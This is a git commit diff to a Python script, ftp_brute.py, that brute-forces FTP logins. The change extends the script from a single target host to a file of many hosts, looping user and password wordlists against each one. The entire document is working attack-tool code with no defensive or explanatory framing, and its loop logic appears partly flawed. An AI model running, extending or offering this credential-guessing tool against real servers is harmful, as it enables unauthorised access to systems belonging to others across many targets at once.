5d65f5e40a70a572e67d7cbdaf1feb8f4f3e6bf6
jonafu94 <jonathanfu1994@gmail.com>
2019-07-28 03:09:16 +0200

    Script reads a host file instead one host

--- ftp_brute.py
+++ ftp_brute.py
@@ -25,40 +25,50 @@ def bruteFtp(hostname,username,password):
 		ftp.quit()
 	except Exception as e:
 		pass
-	print('[-] No luck with: '+username+':'+password)
+	print('[-] No luck with: '+username+':'+password+'@'+hostname)
 	return(None,None)
 
 def main():
-	parser = optparse.OptionParser('usage%prog'+' -H <target host> -u <ftp user file> -p <ftp password file>')
-	parser.add_option('-H', dest='hostname', type='string', help='Specify the target host')
+	parser = optparse.OptionParser('usage%prog'+' -H <target hosts file> -u <ftp user file> -p <ftp password file>')
+	parser.add_option('-H', dest='hfile', type='string', help='Specify the target host')
 	parser.add_option('-u', dest='ufile', type='string', help='Specify the ftp list file')
 	parser.add_option('-p', dest='pfile', type='string', help='Specify the password file')
 	(options,args) = parser.parse_args()
 
-	hostname = options.hostname
+	hfile = options.hfile
 	ufile = options.ufile
 	pfile = options.pfile
+	hf = open(hfile,'r')
 	uf = open(ufile,'r')
 	pf = open(pfile, 'r')
+	hostCounter = 0
+	hostCounterMax = 0
 	userCounter = 0
 	userCounterMax = 0
 	pwCounter = 0
 	pwCounterMax = 0
+	h = []
 	pw = []
 	un = []
+	for hline in hf:
+		h.append(hline.strip('\r').strip('\n'))
+		hostCounterMax += 1
 	for uline in uf:
 		un.append(uline.strip('\r').strip('\n'))
 		userCounterMax = userCounterMax + 1
 	for pline in pf:
 			pw.append(pline.strip('\r').strip('\n'))
 			pwCounterMax = pwCounterMax + 1
-	while userCounter <= userCounterMax and pwCounter < pwCounterMax:
+	while hostCounter <= hostCounterMax and userCounter <= userCounterMax and pwCounter < pwCounterMax:
 		#t = Thread(target=bruteFtp, args=(hostname,username,pw[i]))
 		#t.start()
-		bruteFtp(hostname,un[userCounter],pw[pwCounter])
+		bruteFtp(h[hostCounter],un[userCounter],pw[pwCounter])
 		pwCounter += 1
 		if pwCounter == pwCounterMax-1:
 			pwCounter = 0
+			if userCounter == userCounterMax-1:
+				userCounter = 0
+				hostCounter += 1
 			userCounter += 1
 if __name__ == '__main__':
 	main()
